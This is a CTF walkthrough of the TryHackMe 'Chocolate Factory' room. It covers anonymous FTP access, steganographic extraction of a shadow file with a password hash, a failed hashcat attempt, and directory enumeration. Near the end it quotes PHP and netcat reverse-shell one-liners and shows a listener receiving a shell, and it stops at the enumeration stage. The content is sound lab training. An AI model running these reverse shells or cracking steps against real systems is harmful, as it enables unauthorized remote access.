# ChocolateFactory Walkthrough [Tryhackme.com](https://tryhackme.com/r/room/chocolatefactory)



## Task 1. Introduction.

## TASK 2. Challenges

### Ques 1. Enter the key you found!
```bash
-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
```

### Ques 2. What is Charlie's password?  
```bash
```

### Ques 3. change user to charlie
#### Ans. ---

### Ques 4. Enter the user flag
```bash
```

### Ques 5. Enter the root flag
```bash
```


## 1. So Let make a Nmap scan
```bash
┌──(death㉿esther)-[~]
└─$ nmap 10.10.14.239 -sV -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-20 12:59 IST
Nmap scan report for 10.10.14.239
Host is up (0.26s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 3.0.3
22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
100/tcp open  newacct?
106/tcp open  pop3pw?
109/tcp open  pop2?
110/tcp open  pop3?
111/tcp open  rpcbind?
113/tcp open  ident?
119/tcp open  nntp?
125/tcp open  locus-map?
```

#### So FTP is open let check with default credential

## 2. Let Check FTP

#### default credentials used to login
```bash
anonymous
```
```bash
┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
└─$ ftp 10.10.14.239
Connected to 10.10.14.239.
220 (vsFTPd 3.0.3)
Name (10.10.14.239:death): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

### Oh we got a image here let get it on our system, Maybe there is some data we can retrive
```bash
                                                                                
┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
└─$ ftp 10.10.14.239
Connected to 10.10.14.239.
220 (vsFTPd 3.0.3)
Name (10.10.14.239:death): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||28984|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
226 Directory send OK.
ftp> get gum_room.jpg
local: gum_room.jpg remote: gum_room.jpg
229 Entering Extended Passive Mode (|||50958|)
150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
100% |***********************************|   203 KiB   26.95 KiB/s    00:00 ETA
421 Service not available, remote server has closed connection.
208838 bytes received in 00:08 (23.39 KiB/s)
ftp: No control connection for command
ftp>
```
## 3. Let do steganography 
### I just enter at passphrase, there is no password
```bash
┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
└─$ steghide --extract  -sf gum_room.jpg                        
Enter passphrase: 
wrote extracted data to "b64.txt".
```
### Here is a b64.txt , maybe base 64  , so let convert it directly
```bash
┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
└─$ cat b64.txt| base64 -d
daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::
systemd-resolve:*:18380:0:99999:7:::
_apt:*:18380:0:99999:7:::
mysql:!:18382:0:99999:7:::
tss:*:18382:0:99999:7:::
shellinabox:*:18382:0:99999:7:::
strongswan:*:18382:0:99999:7:::
ntp:*:18382:0:99999:7:::
messagebus:*:18382:0:99999:7:::
arpwatch:!:18382:0:99999:7:::
Debian-exim:!:18382:0:99999:7:::
uuidd:*:18382:0:99999:7:::
debian-tor:*:18382:0:99999:7:::
redsocks:!:18382:0:99999:7:::
freerad:*:18382:0:99999:7:::
iodine:*:18382:0:99999:7:::
tcpdump:*:18382:0:99999:7:::
miredo:*:18382:0:99999:7:::
dnsmasq:*:18382:0:99999:7:::
redis:*:18382:0:99999:7:::
usbmux:*:18382:0:99999:7:::
rtkit:*:18382:0:99999:7:::
sshd:*:18382:0:99999:7:::
postgres:*:18382:0:99999:7:::
avahi:*:18382:0:99999:7:::
stunnel4:!:18382:0:99999:7:::
sslh:!:18382:0:99999:7:::
nm-openvpn:*:18382:0:99999:7:::
nm-openconnect:*:18382:0:99999:7:::
pulse:*:18382:0:99999:7:::
saned:*:18382:0:99999:7:::
inetsim:*:18382:0:99999:7:::
colord:*:18382:0:99999:7:::
i2psvc:*:18382:0:99999:7:::
dradis:*:18382:0:99999:7:::
beef-xss:*:18382:0:99999:7:::
geoclue:*:18382:0:99999:7:::
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```
### Oh so it /etc/passwd , here is the hash. let send it to hashcat 
```bash
──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
└─$ hashcat -m 1800 -a 3 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-1240P, 2752/5568 MB (1024 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Brute-Force
````
### Not able to crack hash using rockyou, let find another way.
## 4. Let do directory search to get more info
```bash
┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
└─$ dirsearch -u 10.10.14.239 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/Lab-CTF/Choclaate_Factory/reports/_10.10.14.239/_24-04-20_19-34-48.txt

Target: http://10.10.14.239/

[19:34:49] Starting: 
[19:34:58] 403 -  277B  - /.ht_wsr.txt
[19:34:58] 403 -  277B  - /.htaccess.bak1
[19:34:58] 403 -  277B  - /.htaccess.sample
[19:34:58] 403 -  277B  - /.htaccess.orig
[19:34:58] 403 -  277B  - /.htaccess_orig
[19:34:58] 403 -  277B  - /.htaccess.save
[19:34:58] 403 -  277B  - /.htaccess_extra
[19:34:58] 403 -  277B  - /.htaccessOLD
[19:34:58] 403 -  277B  - /.htaccessBAK
[19:34:58] 403 -  277B  - /.htaccess_sc
[19:34:58] 403 -  277B  - /.htaccessOLD2
[19:34:58] 403 -  277B  - /.html
[19:34:58] 403 -  277B  - /.htm
[19:34:58] 403 -  277B  - /.htpasswds
[19:34:58] 403 -  277B  - /.htpasswd_test
[19:34:58] 403 -  277B  - /.httr-oauth
[19:35:00] 403 -  277B  - /.php
[19:35:02] 403 -  277B  - /.swp
[19:36:19] 200 -  330B  - /home.php
[19:36:20] 200 -  273B  - /index.php.bak
[19:36:43] 403 -  277B  - /server-status/
[19:36:43] 403 -  277B  - /server-status
[#################   ] 85%   9764/11460        60/s       job:1/1  errors:0Exception in thread Thread-26 (thread_proc):
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/dirsearch/lib/core/fuzzer.py", line 261, in thread_proc
    self.scan(self._base_path + path, scanners)
  File "/usr/lib/python3/dist-packages/dirsearch/lib/core/fuzzer.py", line 168, in scan
    response = self._requester.request(path)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/dirsearch/lib/connection/requester.py", line 222, in request
Exception in thread Thread-14 (thread_proc):
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/dirsearch/lib/core/fuzzer.py", line 261, in thread_proc
    raise RequestException(err_msg)
lib.core.exceptions.RequestException: Request timeout: http://10.10.14.239/sql/sqlweb/

During handling of the above exception, another exception occurred:

```
###  I got some error so but its okay we got page
### Ok so i get two pages let check it out

### So it login page,
![Screenshot from 2024-04-22 11-41-22](https://github.com/Esther7171/ChocolateFactory/assets/122229257/725db937-20c7-4046-9aac-3311a14be287)


### This one is command execution panel.

![Screenshot from 2024-04-22 11-40-45](https://github.com/Esther7171/ChocolateFactory/assets/122229257/1a68d2ad-7b6b-4204-9a87-83e1c71f933f)

### Let try to run some basic commands.

#### By doing ```ls``` we got,
![Screenshot from 2024-04-22 11-42-13](https://github.com/Esther7171/ChocolateFactory/assets/122229257/e0260218-348e-4ea3-bc73-ebd3d62a918f)

### Here is key let to cat
So it in Non readable formate
![Screenshot from 2024-04-22 11-43-20](https://github.com/Esther7171/ChocolateFactory/assets/122229257/b3f71a96-87c8-4492-a082-95cc3a82c53a)


### Let try to strings to read it 
![Screenshot from 2024-04-22 11-43-30](https://github.com/Esther7171/ChocolateFactory/assets/122229257/2949e129-9133-48ad-a588-3c067bca3d9a)


```bash

/lib64/ld-linux-x86-64.so.2 libc.so.6 __isoc99_scanf puts __stack_chk_fail printf __cxa_finalize strcmp __libc_start_main GLIBC_2.7 GLIBC_2.4 GLIBC_2.2.5 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable 5j %l %j %b %Z %R %J %b =9 AWAVI AUATL []A\A]A^A_ Enter your name: laksdhfas congratulations you have found the key: b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=' Keep its safe Bad name! ;*3$" GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0 crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.7698 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry license.c __FRAME_END__ __init_array_end _DYNAMIC __init_array_start __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_csu_fini _ITM_deregisterTMCloneTable puts@@GLIBC_2.2.5 _edata __stack_chk_fail@@GLIBC_2.4 printf@@GLIBC_2.2.5 __libc_start_main@@GLIBC_2.2.5 __data_start strcmp@@GLIBC_2.2.5 __gmon_start__ __dso_handle _IO_stdin_used __libc_csu_init __bss_start main __isoc99_scanf@@GLIBC_2.7 __TMC_END__ _ITM_registerTMCloneTable __cxa_finalize@@GLIBC_2.2.5 .symtab .strtab .shstrtab .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .data .bss .comment 
```
### here is key in 2 line
```bash
'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```
### Its a base 64 let try to convert it
### No it not as bas64 but look like..

### We got key , Let try to upload a reverse-shell here, so it in php formate let try php shell

## 5. Let uploads
```here are all the reverse-shell```
```bash
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```
### I'm taking this one 
```bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
### let open netcat listner and change IP in reverse shell

```bash
┌──(death㉿esther)-[~/Lab-CTF/Choclaate_Factory]
└─$ nc -nlvp 1234
```
listening on [any] 1234 ...

### I'm not getting any connection mean that wrong let try to upload a netcat reverse shell
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
### Let try this one, change IP, Let upload it 
![Screenshot from 2024-04-22 11-35-41](https://github.com/Esther7171/ChocolateFactory/assets/122229257/bd40e4d9-6a13-4f25-aada-ff7a9b1cce31)

### Let setup listener !! Here wo got connection
```bash
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.17.120.99] from (UNKNOWN) [10.10.14.239] 35024
/bin/sh: 0: can't access tty; job control turned off
$ 
```
### Let enumerate manually




